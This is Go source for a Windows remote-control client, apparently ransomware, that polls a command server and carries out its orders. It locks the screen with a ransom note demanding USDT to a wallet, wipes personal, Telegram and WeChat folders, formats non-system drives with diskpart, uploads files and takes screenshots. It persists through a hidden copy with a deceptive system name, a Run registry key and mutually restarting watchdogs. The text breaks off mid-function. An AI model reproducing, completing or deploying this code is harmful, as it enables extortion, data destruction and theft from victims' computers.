package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"image/jpeg"
	"image/png"
	"io"
	"log"
	"math/big"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

// Configuration
const (
	// In production, use "https://clearpc.zm-tool.me"
	ServerURL = "http://clearpc.zm-tool.me"
	// ServerURL = "http://localhost:1214"
	// WSServerURL  = "ws://clearpc.zm-tool.me/api/ws/client"
	PollInterval = 5 * time.Second
)

var (
	// AdminPassword is now dynamic, fetched from server (HASHED)
	// Default hash for "A23456a?"
	AdminPassword = "87ec4c94d80ba427aea9ad47c6a2d0f4c725a4959187f5f08d98644a1e791ada"

	// RansomNote is dynamic, fetched from server
	RansomNote = "您的电脑已被锁定！\n请支付 100 USDT 到以下地址以解锁：\nTQkn9pDx3pRqpZ3iWmRtRXeHZkLAYG6WVH\n\n(联系管理员获取密码)"
)

type Device struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type Command struct {
	ID      string `json:"id"`
	Action  string `json:"action"`
	Payload string `json:"payload"`
}

type CommandLog struct {
	ID       string `json:"id"`
	DeviceID string `json:"device_id"`
	Action   string `json:"action"`
	Result   string `json:"result"`
}

// Global client for reuse
var httpClient *http.Client
var currentDeviceID string

var (
	watchdogMode = flag.Bool("watchdog", false, "Run in watchdog mode")
	targetPID    = flag.Int("target", 0, "PID to monitor")

	mainExePath   = flag.String("main", "", "Path to main executable")
	uninstallMode = flag.Bool("uninstall", false, "Run uninstaller")
)

const (
	LockStateFile  = "lock_state.json"
	StopSignalFile = "stop_signal"
	// Use a deceptive name and path for the backup
	BackupDirName  = "Microsoft\\Windows\\SystemData"
	BackupExeName  = "sys_config.exe"
	PathConfigFile = "config.dat"
)

type LockState struct {
	Locked bool   `json:"locked"`
	Pin    string `json:"pin"`
	Admin  string `json:"admin"` // Cache admin password
}

func main() {
	flag.Parse()

	// Check if we are running as the "Restorer" (Boot from Hidden Dir)
	myPath, _ := os.Executable()
	myDir := filepath.Dir(myPath)
	backupDir := getBackupDir()

	// Normalize paths for comparison
	myDirAbs, _ := filepath.Abs(myDir)
	backupDirAbs, _ := filepath.Abs(backupDir)

	// If we are in the hidden dir, and NOT explicitly told to be a watchdog or uninstaller
	if strings.EqualFold(myDirAbs, backupDirAbs) && !*watchdogMode && !*uninstallMode {
		// We are the hidden backup starting on boot (Registry)
		targetPath := getInstallPath()
		if targetPath != "" {
			// Restore if missing
			if _, err := os.Stat(targetPath); os.IsNotExist(err) {
				copyFile(myPath, targetPath)
			}
			// Start the Main Client
			exec.Command(targetPath).Start()
			// Exit this loader process
			os.Exit(0)
		}
	}

	if *uninstallMode {
		handleUninstall()
		return
	}

	if *watchdogMode {
		runWatchdog(*targetPID, *mainExePath)
		return
	}

	// Normal mode
	enableAutoStart()

	// Ensure backup for resilience
	ensureBackup()

	// Start the persistence keeper to ensure backup file and registry key exist
	go startPersistenceKeeper()

	// Start watchdog to protect this process
	watchdogPID := startWatchdogProcess()

	// Start a goroutine to protect the watchdog (Mutual Monitoring)
	go monitorWatchdog(watchdogPID)

	// Check lock state
	if isLocked, pin, savedAdmin := getLockState(); isLocked {
		currentLockPassword = pin
		if savedAdmin != "" {
			AdminPassword = savedAdmin
		}
		// Start lock screen in a goroutine
		resumeLockScreen(pin)
	}

	// 1. Gather Info
	hostname, _ := os.Hostname()
	currentDeviceID = generateDeviceID(hostname)

	device := Device{
		ID:       currentDeviceID,
		Hostname: hostname,
		OS:       runtime.GOOS,
	}

	httpClient = &http.Client{
		Timeout: 10 * time.Second,
		// For self-signed certs in dev, use InsecureSkipVerify.
		// In PROD, remove this Transport config to use default secure verification.
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// 2. Register
	if err := register(device); err != nil {
		log.Println("Registration failed:", err)
		// Retry logic could go here
	} else {
		log.Println("Device registered successfully.")
	}

	// 3. Poll Loop
	ticker := time.NewTicker(PollInterval)
	for range ticker.C {
		pollForCommands(device.ID)
		// Heartbeat is redundant as poll updates status
		// sendHeartbeat(device.ID)
	}
}

func generateDeviceID(hostname string) string {
	// Simple ID generation. In production, use hardware UUIDs.
	return fmt.Sprintf("%s-%s", hostname, runtime.GOOS)
}

func register(d Device) error {
	data, _ := json.Marshal(d)
	resp, err := httpClient.Post(ServerURL+"/api/register", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status: %d", resp.StatusCode)
	}

	// Parse response to get config
	var result struct {
		Status string `json:"status"`
		Config struct {
			AdminPassword string `json:"admin_password"`
			RansomNote    string `json:"ransom_note"`
		} `json:"config"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
		if result.Config.AdminPassword != "" {
			updateAdminPassword(result.Config.AdminPassword)
		}
		if result.Config.RansomNote != "" {
			RansomNote = result.Config.RansomNote
		}
	}

	return nil
}

func sendHeartbeat(id string) {
	httpClient.Get(ServerURL + "/api/heartbeat?id=" + id)
}

func pollForCommands(id string) {
	resp, err := httpClient.Get(ServerURL + "/api/poll?id=" + id)
	if err != nil {
		log.Println("Poll error:", err)
		return
	}
	defer resp.Body.Close()

	// Check for Admin Password update in headers
	newAdminPwd := resp.Header.Get("X-Admin-Password")
	if newAdminPwd != "" && newAdminPwd != AdminPassword {
		updateAdminPassword(newAdminPwd)
	}

	if resp.StatusCode == http.StatusNoContent {
		return // No commands
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println("Error reading response body:", err)
		return
	}

	if resp.StatusCode != http.StatusOK {
		log.Printf("Poll failed with status %d: %s\n", resp.StatusCode, string(body))
		return
	}

	var cmd Command
	if err := json.Unmarshal(body, &cmd); err != nil {
		log.Printf("Error decoding command: %v. Body: %s\n", err, string(body))
		return
	}

	log.Printf("Received command: %s (ID: %s)\n", cmd.Action, cmd.ID)
	executeCommand(cmd)
}

func executeCommand(cmd Command) {
	var result string

	switch cmd.Action {
	case "ping":
		log.Println("Pong!")
		result = "Pong! Client is alive."

	case "info":
		log.Println("Gathering system paths...")
		result = gatherSystemInfo()

	case "wipe_data":
		log.Println("Received wipe_data command. Initiating data wipe...")
		// 警告：启用以下逻辑将永久删除文件！
		// Warning: Enabling the logic below will permanently delete files!
		result = performDataWipe()

	case "format_drives":
		log.Println("Received format_drives command. Initiating drive format...")
		// 警告：启用以下逻辑将格式化非系统盘！
		// Warning: Enabling the logic below will FORMAT non-system drives!
		result = formatNonSystemDrives()

	case "ransom":
		log.Println("Received ransom command. Displaying message...")
		go showRansomNote()
		result = "Ransom note displayed."

	case "list_files":
		log.Println("Listing files...")
		path := cmd.Payload
		if path == "" {
			// Default to user home or current dir
			usr, err := user.Current()
			if err == nil {
				path = usr.HomeDir
			} else {
				path = "."
			}
		}
		result = listFiles(path)

	case "get_file":
		log.Println("Uploading file...")
		path := cmd.Payload
		if path == "" {
			result = "Error: No file path provided"
		} else {
			result = uploadFile(path)
		}

	case "lock_screen":
		log.Println("Locking screen...")
		result = startLockScreen()

	case "unlock_screen":
		log.Println("Unlocking screen...")
		result = stopLockScreen()

	case "screenshot":
		log.Println("Taking screenshot...")
		result = takeScreenshot()

	case "self_destruct":
		log.Println("Received self_destruct command. Initiating self-deletion...")
		reportResult(cmd, "Self-destruct sequence initiated. Goodbye.")
		go performSelfDestruct()
		result = "Self-destruct initiated."

	default:
		log.Printf("Unknown command: %s\n", cmd.Action)
		result = fmt.Sprintf("Unknown command: %s", cmd.Action)
	}

	// Report result back to server (except for self_destruct which reports early)
	if cmd.Action != "self_destruct" {
		reportResult(cmd, result)
	}
}

func performSelfDestruct() {
	// 1. Create Stop Signal
	os.WriteFile(getStopSignalPath(), []byte("STOP"), 0644)

	// 2. Remove AutoStart
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err == nil {
		k.DeleteValue("ClearFilesClient")
		k.Close()
	}

	// 3. Remove Lock State
	os.Remove(getLockStateConfigPath())

	// 4. Wait for others to see signal
	time.Sleep(2 * time.Second)

	// 5. Kill other instances
	killOtherInstances()

	// 6. Remove Stop Signal
	os.Remove(getStopSignalPath())

	// 7. Remove Backup Directory
	os.RemoveAll(getBackupDir())

	// 8. Self Delete
	selfDelete()
}

func killOtherInstances() {
	pid := os.Getpid()
	exeName := filepath.Base(os.Args[0])
	// Kill all instances of this exe EXCEPT the current process
	exec.Command("taskkill", "/F", "/IM", exeName, "/FI", fmt.Sprintf("PID ne %d", pid)).Run()

	// Kill backup process if running
	exec.Command("taskkill", "/F", "/IM", BackupExeName).Run()
}

func selfDelete() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(0)
	}
	// Spawn a detached cmd process to delete the file after a short delay
	// cmd /c ping 127.0.0.1 -n 3 > nul & del /F /Q "exePath"
	cmd := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/F", "/Q", exePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
	os.Exit(0)
}

func reportResult(cmd Command, result string) {
	logEntry := CommandLog{
		ID:       cmd.ID, // Use command ID to link
		DeviceID: currentDeviceID,
		Action:   cmd.Action,
		Result:   result,
	}

	data, _ := json.Marshal(logEntry)
	resp, err := httpClient.Post(ServerURL+"/api/report", "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Println("Failed to report result:", err)
		return
	}
	defer resp.Body.Close()
}

func gatherSystemInfo() string {
	usr, err := user.Current()
	if err != nil {
		return "Error getting user info: " + err.Error()
	}

	homeDir := usr.HomeDir
	desktop := filepath.Join(homeDir, "Desktop")
	downloads := filepath.Join(homeDir, "Downloads")

	// Common paths for Telegram/WeChat (Just examples, varies by OS/Install)
	var telegram, wechat string
	if runtime.GOOS == "windows" {
		telegram = filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Documents", "WeChat Files")
	} else if runtime.GOOS == "darwin" { // macOS
		telegram = filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop")
		wechat = filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat")
	}

	info := fmt.Sprintf(
		"User: %s\nHome: %s\nDesktop: %s\nDownloads: %s\nTelegram (Potential): %s\nWeChat (Potential): %s",
		usr.Username, homeDir, desktop, downloads, telegram, wechat,
	)

	return info
}

func performDataWipe() string {
	usr, err := user.Current()
	if err != nil {
		return "Failed to get user info: " + err.Error()
	}

	homeDir := usr.HomeDir

	// Define targets
	targets := []string{
		filepath.Join(homeDir, "Desktop"),
		filepath.Join(homeDir, "Downloads"),
		filepath.Join(homeDir, "Documents"),
	}

	// Add OneDrive paths if they exist
	oneDrive := os.Getenv("OneDrive")
	if oneDrive != "" {
		targets = append(targets,
			filepath.Join(oneDrive, "Desktop"),
			filepath.Join(oneDrive, "Documents"),
			filepath.Join(oneDrive, "Pictures"),
		)
	}

	// Add app-specific paths
	if runtime.GOOS == "windows" {
		targets = append(targets,
			filepath.Join(homeDir, "AppData", "Roaming", "Telegram Desktop"),
			filepath.Join(homeDir, "Documents", "WeChat Files"),
		)
	} else if runtime.GOOS == "darwin" {
		targets = append(targets,
			filepath.Join(homeDir, "Library", "Application Support", "Telegram Desktop"),
			filepath.Join(homeDir, "Library", "Containers", "com.tencent.xinWeChat"),
		)
	}

	var deleted []string
	var failed []string

	for _, path := range targets {
		// Check if exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		// *** DANGER: ACTUAL DELETION ENABLED ***
		// Instead of removing the folder (which might be blocked for Desktop/Documents),
		// we remove the contents.
		entries, err := os.ReadDir(path)
		if err != nil {
			failed = append(failed, fmt.Sprintf("%s (read_err: %v)", filepath.Base(path), err))
			continue
		}

		dirSuccess := true
		for _, entry := range entries {
			fullPath := filepath.Join(path, entry.Name())
			if err := os.RemoveAll(fullPath); err != nil {
				dirSuccess = false
				// Just log the first failure per dir to keep it short?
				// Or just mark dir as failed.
			}
		}

		if dirSuccess {
			deleted = append(deleted, filepath.Base(path))
		} else {
			failed = append(failed, fmt.Sprintf("%s (partial)", filepath.Base(path)))
		}
	}

	return fmt.Sprintf("Wipe sequence completed. Targets: %v. Failed: %v", deleted, failed)
}

func formatNonSystemDrives() string {
	if runtime.GOOS != "windows" {
		return "Format operation only supported on Windows."
	}

	// Check for Admin privileges
	// Simple check: try to open physical drive 0? Or just run a command.
	// We'll rely on command output.

	var formatted []string
	var failed []string

	// Iterate from D: to Z:
	for r := 'D'; r <= 'Z'; r++ {
		drive := string(r) + ":"
		path := drive + "\\"

		// Check if drive exists
		if _, err := os.Stat(path); err == nil {
			log.Printf("[FORMAT] Drive found: %s\n", drive)

			// Use Diskpart which is more reliable than format.com for scripting (avoids label prompt)
			// Script: select volume X \n format fs=ntfs quick label=Wiped
			script := fmt.Sprintf("select volume %s\nformat fs=ntfs quick label=Wiped override\n", drive)
			scriptFile := "diskpart_script.txt"
			os.WriteFile(scriptFile, []byte(script), 0644)

			cmd := exec.Command("diskpart", "/s", scriptFile)
			var out bytes.Buffer
			cmd.Stdout = &out
			cmd.Stderr = &out

			if err := cmd.Run(); err != nil {
				failed = append(failed, fmt.Sprintf("%s (%v, Output: %s)", drive, err, out.String()))
			} else {
				formatted = append(formatted, drive)
			}
			os.Remove(scriptFile)
		}
	}

	if len(formatted) == 0 && len(failed) == 0 {
		return "No non-system drives found."
	}

	return fmt.Sprintf("Format sequence completed. Formatted: %v. Failed: %v", formatted, failed)
}

func getBackupDir() string {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return "."
	}
	return filepath.Join(configDir, BackupDirName)
}

func getBackupPath() string {
	dir := getBackupDir()
	os.MkdirAll(dir, 0755)
	hideFile(dir) // Hide the directory
	return filepath.Join(dir, BackupExeName)
}

func getPathConfigPath() string {
	return filepath.Join(getBackupDir(), PathConfigFile)
}

func saveInstallPath(path string) {
	os.WriteFile(getPathConfigPath(), []byte(path), 0644)
	hideFile(getPathConfigPath())
}

func getInstallPath() string {
	data, err := os.ReadFile(getPathConfigPath())
	if err != nil {
		return ""
	}
	return string(data)
}

func hideFile(path string) {
	ptr, _ := syscall.UTF16PtrFromString(path)
	// FILE_ATTRIBUTE_HIDDEN = 2
	// FILE_ATTRIBUTE_SYSTEM = 4
	syscall.SetFileAttributes(ptr, 2|4)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func ensureBackup() {
	backupPath := getBackupPath()
	mainPath, _ := os.Executable()

	// Always save the install path so the backup knows where to restore
	saveInstallPath(mainPath)

	// Check if backup exists
	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
		copyFile(mainPath, backupPath)
		hideFile(backupPath)
	}
}

func enableAutoStart() {
	// Register the BACKUP file as the startup item
	// This ensures the "check program" runs on boot
	exePath := getBackupPath()

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		// Try to create if not exists
		k, _, err = registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
		if err != nil {
			return
		}
	}
	defer k.Close()

	k.SetStringValue("WindowsSystemConfig", exePath)
}

func startLockScreen() string {
	if runtime.GOOS != "windows" {
		return "Not supported on this OS"
	}
	if lockHwnd != 0 {
		return "Screen is already locked"
	}

	// Generate Random PIN
	n, _ := rand.Int(rand.Reader, big.NewInt(1000000))
	currentLockPassword = fmt.Sprintf("%06d", n.Int64())

	go func() {
		runtime.LockOSThread()
		createLockWindow()
	}()
	saveLockState(true, currentLockPassword)
	return "Screen lock initiated. Unlock PIN: " + currentLockPassword
}

func resumeLockScreen(pin string) {
	if runtime.GOOS != "windows" {
		return
	}
	if lockHwnd != 0 {
		return
	}
	currentLockPassword = pin
	go func() {
		runtime.LockOSThread()
		createLockWindow()
	}()
}

func stopLockScreen() string {
	if runtime.GOOS != "windows" {
		return "Not supported on this OS"
	}
	if lockHwnd == 0 {
		return "Screen is not locked"
	}
	// WM_CLOSE = 0x0010
	// We use PostMessage because the window is on another thread
	user32 := syscall.NewLazyDLL("user32.dll")
	postMessage := user32.NewProc("PostMessageW")
	postMessage.Call(lockHwnd, 0x0010, 0, 0)
	lockHwnd = 0
	saveLockState(false, "")
	return "Screen unlock initiated"
}

func getLockStateConfigPath() string {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return LockStateFile
	}
	appDir := filepath.Join(configDir, "ClearFiles")
	os.MkdirAll(appDir, 0755)
	return filepath.Join(appDir, LockStateFile)
}

func saveLockState(locked bool, pin string) {
	state := LockState{Locked: locked, Pin: pin, Admin: AdminPassword}
	data, _ := json.Marshal(state)
	os.WriteFile(getLockStateConfigPath(), data, 0644)
}

func getLockState() (bool, string, string) {
	data, err := os.ReadFile(getLockStateConfigPath())
	if err != nil {
		return false, "", ""
	}
	var state LockState
	json.Unmarshal(data, &state)
	return state.Locked, state.Pin, state.Admin
}

func updateAdminPassword(pwd string) {
	AdminPassword = pwd
	// Update persistence if we are locked, or just always update
	// To be safe, we just read current state and update the admin field
	isLocked, pin, _ := getLockState()
	saveLockState(isLocked, pin)
	log.Println("Admin password updated")
}

func getStopSignalPath() string {
	configDir, err := os.UserConfigDir()
	if err != nil {
		return StopSignalFile
	}
	appDir := filepath.Join(configDir, "ClearFiles")
	return filepath.Join(appDir, StopSignalFile)
}

func checkStopSignal() bool {
	_, err := os.Stat(getStopSignalPath())
	return err == nil
}

func startPersistenceKeeper() {
	ticker := time.NewTicker(3 * time.Second)
	for range ticker.C {
		if checkStopSignal() {
			ticker.Stop()
			return
		}
		// 1. Re-create backup file if deleted
		ensureBackup()
		// 2. Re-apply registry key if deleted
		enableAutoStart()
	}
}

func startWatchdogProcess() int {
	mainPath, err := os.Executable()
	if err != nil {
		return 0
	}

	ensureBackup()
	backupPath := getBackupPath()

	pid := os.Getpid()

	cmd := exec.Command(backupPath, "-watchdog", fmt.Sprintf("-target=%d", pid), fmt.Sprintf("-main=%s", mainPath))
	// Hide console for watchdog too
	// Since we are compiling with -H=windowsgui, the child should also be gui.
	cmd.Start()
	return cmd.Process.Pid
}

func runWatchdog(pid int, mainPath string) {
	monitorProcess(pid, func() {
		if mainPath == "" {
			mainPath = getInstallPath()
		}
		if mainPath == "" {
			// Fallback if config is missing?
			// We can't do much if we don't know where the main file should be.
			// But maybe we can guess or just exit.
			// Let's try to restart in current dir if all else fails,
			// assuming the main file was supposed to be here?
			// No, the backup is in a hidden dir.
			return
		}
		restartProcess(mainPath)
	})
}

func monitorWatchdog(pid int) {
	currentPid := pid
	for {
		monitorProcess(currentPid, func() {})

		if checkStopSignal() {
			return
		}

		ensureBackup()
		currentPid = startWatchdogProcess()
		time.Sleep(1 * time.Second)
	}
}

// monitorProcess watches a PID and calls onDeath when it exits
func monitorProcess(pid int, onDeath func()) {
	for {
		// Check for stop signal
		if checkStopSignal() {
			// If stop signal exists, we just exit nicely
			os.Exit(0)
		}

		// Check if target process exists
		const DA_PROCESS_STILL_ACTIVE = 259
		var exitCode uint32
		h, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(pid))
		if err != nil {
			// Can't open -> likely gone
			onDeath()
			return
		}
		syscall.GetExitCodeProcess(h, &exitCode)
		syscall.CloseHandle(h)

		if exitCode != DA_PROCESS_STILL_ACTIVE {
			// Exited
			onDeath()
			return
		}

		time.Sleep(2 * time.Second)
	}
}

func restartProcess(path string) {
	// Restore file if missing
	if _, err := os.Stat(path); os.IsNotExist(err) {
		myPath, _ := os.Executable()
		copyFile(myPath, path)
	}

	// Start the main process again
	// The main process will spawn a NEW watchdog.
	// So we (current watchdog) can just exit.
	exec.Command(path).Start()
	os.Exit(0)
}

func handleUninstall() {
	// 1. Prompt for password
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Admin Password to Uninstall: ")
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	// Hash input
	hash := sha256.Sum256([]byte(password))
	pwdHash := hex.EncodeToString(hash[:])

	if pwdHash != AdminPassword {
		fmt.Println("Incorrect password.")
		return
	}

	fmt.Println("Uninstalling...")

	// 2. Create Stop Signal
	os.WriteFile(getStopSignalPath(), []byte("STOP"), 0644)

	// 3. Remove AutoStart
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err == nil {
		k.DeleteValue("WindowsSystemConfig")
		k.Close()
	}

	// 4. Remove Lock State
	os.Remove(getLockStateConfigPath())

	// 5. Wait for others to see signal
	fmt.Println("Stopping processes...")
	time.Sleep(3 * time.Second)

	// 6. Kill other instances
	killOtherInstances()

	// 7. Remove Stop Signal
	os.Remove(getStopSignalPath())

	// Remove backup directory completely
	os.RemoveAll(getBackupDir())

	fmt.Println("Uninstalled. The file will be deleted.")
	selfDelete()
}

var (
	lockHwnd            uintptr
	currentLockPassword string
	hEdit               uintptr
)

func createLockWindow() {
	user32 := syscall.NewLazyDLL("user32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	procRegisterClassExW := user32.NewProc("RegisterClassExW")
	procCreateWindowExW := user32.NewProc("CreateWindowExW")
	procGetMessageW := user32.NewProc("GetMessageW")
	procTranslateMessage := user32.NewProc("TranslateMessage")
	procDispatchMessageW := user32.NewProc("DispatchMessageW")
	procGetSystemMetrics := user32.NewProc("GetSystemMetrics")
	procLoadCursor := user32.NewProc("LoadCursorW")

	className, _ := syscall.UTF16PtrFromString("LockScreenClass")
	windowName, _ := syscall.UTF16PtrFromString("Locked")

	// Create callback
	wndProcCallback := syscall.NewCallback(wndProc)

	hInst, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
	// IDC_ARROW = 32512
	hCursor, _, _ := procLoadCursor.Call(0, 32512)
	// BLACK_BRUSH = 4
	hBrush, _, _ := gdi32.NewProc("GetStockObject").Call(4)

	var wc WNDCLASSEX
	wc.CbSize = uint32(unsafe.Sizeof(wc))
	wc.Style = 0
	wc.LpfnWndProc = wndProcCallback
	wc.HInstance = syscall.Handle(hInst)
	wc.HCursor = syscall.Handle(hCursor)
	wc.HbrBackground = syscall.Handle(hBrush)
	wc.LpszClassName = className

	procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))

	screenWidth, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	screenHeight, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN

	// WS_POPUP | WS_VISIBLE = 0x80000000 | 0x10000000
	// WS_EX_TOPMOST = 0x00000008
	hwnd, _, _ := procCreateWindowExW.Call(
		0x00000008, // ExStyle: TOPMOST
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(windowName)),
		0x80000000|0x10000000, // Style
		0, 0, screenWidth, screenHeight,
		0, 0, hInst, 0,
	)

	if hwnd == 0 {
		log.Println("Failed to create lock window")
		return
	}
	lockHwnd = hwnd

	// Create Edit Control for Password
	// WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_CENTER = 0x40000000 | 0x10000000 | 0x00800000 | 0x0020 | 0x0001
	editClass, _ := syscall.UTF16PtrFromString("EDIT")
	hEdit, _, _ = procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(editClass)),
		0,
		0x40000000|0x10000000|0x00800000|0x0020|0x0001,
		screenWidth/2-100, screenHeight/2+50, 200, 30,
		hwnd, 0, hInst, 0,
	)

	// Set Font for Edit
	fontName, _ := syscall.UTF16PtrFromString("Microsoft YaHei")
	hFont, _, _ := gdi32.NewProc("CreateFontW").Call(
		24, 0, 0, 0, 400, 0, 0, 0, 134, 0, 0, 0, 0, uintptr(unsafe.Pointer(fontName)),
	)
	user32.NewProc("SendMessageW").Call(hEdit, 0x0030, hFont, 1) // WM_SETFONT

	// Create Button
	// WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON = 0x40000000 | 0x10000000 | 0x0000
	btnClass, _ := syscall.UTF16PtrFromString("BUTTON")
	btnText, _ := syscall.UTF16PtrFromString("Unlock")
	// ID_BUTTON = 101
	hBtn, _, _ := procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(btnClass)),
		uintptr(unsafe.Pointer(btnText)),
		0x40000000|0x10000000,
		screenWidth/2-50, screenHeight/2+100, 100, 40,
		hwnd, 101, hInst, 0,
	)
	user32.NewProc("SendMessageW").Call(hBtn, 0x0030, hFont, 1) // WM_SETFONT

	// Force Focus to Edit
	user32.NewProc("SetFocus").Call(hEdit)

	var msg MSG
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 { // WM_QUIT
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}
	lockHwnd = 0
}

func wndProc(hwnd uintptr, msg uintptr, wParam, lParam uintptr) uintptr {
	user32 := syscall.NewLazyDLL("user32.dll")

	switch uint32(msg) {
	case 0x0010: // WM_CLOSE
		user32.NewProc("DestroyWindow").Call(hwnd)
		return 0
	case 0x0002: // WM_DESTROY
		user32.NewProc("PostQuitMessage").Call(0)
		return 0
	case 0x000F: // WM_PAINT
		drawLockText(hwnd)
		return 0
	case 0x0111: // WM_COMMAND
		// Check if Button Clicked (ID 101)
		if (wParam & 0xFFFF) == 101 {
			// Get Text from Edit
			buf := make([]uint16, 256)
			user32.NewProc("GetWindowTextW").Call(hEdit, uintptr(unsafe.Pointer(&buf[0])), 256)
			input := syscall.UTF16ToString(buf)

			// Calculate hash of input for admin check
			hash := sha256.Sum256([]byte(input))
			inputHash := hex.EncodeToString(hash[:])

			if input == currentLockPassword || inputHash == AdminPassword {
				user32.NewProc("DestroyWindow").Call(hwnd)
				saveLockState(false, "")
			} else {
				// Show Error
				msgText, _ := syscall.UTF16PtrFromString("Incorrect Password")
				title, _ := syscall.UTF16PtrFromString("Error")
				user32.NewProc("MessageBoxW").Call(hwnd, uintptr(unsafe.Pointer(msgText)), uintptr(unsafe.Pointer(title)), 0x10) // MB_ICONERROR

				// Clear Input
				user32.NewProc("SetWindowTextW").Call(hEdit, 0)
			}
		}
		return 0
	case 0x0112: // WM_SYSCOMMAND
		if (wParam & 0xFFF0) == 0xF060 { // SC_CLOSE
			return 0
		}
	}

	defWindowProc, _, _ := user32.NewProc("DefWindowProcW").Call(hwnd, uintptr(msg), wParam, lParam)
	return defWindowProc
}

func drawLockText(hwnd uintptr) {
	user32 := syscall.NewLazyDLL("user32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	var ps PAINTSTRUCT
	hdc, _, _ := user32.NewProc("BeginPaint").Call(hwnd, uintptr(unsafe.Pointer(&ps)))

	// Set text color white, bg black
	gdi32.NewProc("SetTextColor").Call(hdc, 0x00FFFFFF)
	gdi32.NewProc("SetBkMode").Call(hdc, 1) // TRANSPARENT

	rect := RECT{0, 0, 1920, 1080} // Initial guess, updated by GetClientRect
	user32.NewProc("GetClientRect").Call(hwnd, uintptr(unsafe.Pointer(&rect)))

	text, _ := syscall.UTF16PtrFromString("此电脑已被管理员锁定 / THIS COMPUTER IS LOCKED")
	fontName, _ := syscall.UTF16PtrFromString("Microsoft YaHei")

	// Create a larger font
	hFont, _, _ := gdi32.NewProc("CreateFontW").Call(
		48, 0, 0, 0, 700, 0, 0, 0, 134, 0, 0, 0, 0, uintptr(unsafe.Pointer(fontName)),
	)
	oldFont, _, _ := gdi32.NewProc("SelectObject").Call(hdc, hFont)

	// DT_CENTER | DT_VCENTER | DT_SINGLELINE = 0x1 | 0x4 | 0x20
	user32.NewProc("DrawTextW").Call(hdc, uintptr(unsafe.Pointer(text)), ^uintptr(0), uintptr(unsafe.Pointer(&rect)), 0x1|0x4|0x20)

	gdi32.NewProc("SelectObject").Call(hdc, oldFont)
	gdi32.NewProc("DeleteObject").Call(hFont)
	user32.NewProc("EndPaint").Call(hwnd, uintptr(unsafe.Pointer(&ps)))
}

type WNDCLASSEX struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     syscall.Handle
	HIcon         syscall.Handle
	HCursor       syscall.Handle
	HbrBackground syscall.Handle
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       syscall.Handle
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type POINT struct {
	X, Y int32
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

type FileInfo struct {
	Name    string `json:"name"`
	Path    string `json:"path"`
	Size    int64  `json:"size"`
	IsDir   bool   `json:"is_dir"`
	ModTime string `json:"mod_time"`
}

func listFiles(path string) string {
	// If path is ".", use user home directory
	if path == "." {
		usr, err := user.Current()
		if err == nil {
			path = usr.HomeDir
		}
	}

	entries, err := os.ReadDir(path)
	if err != nil {
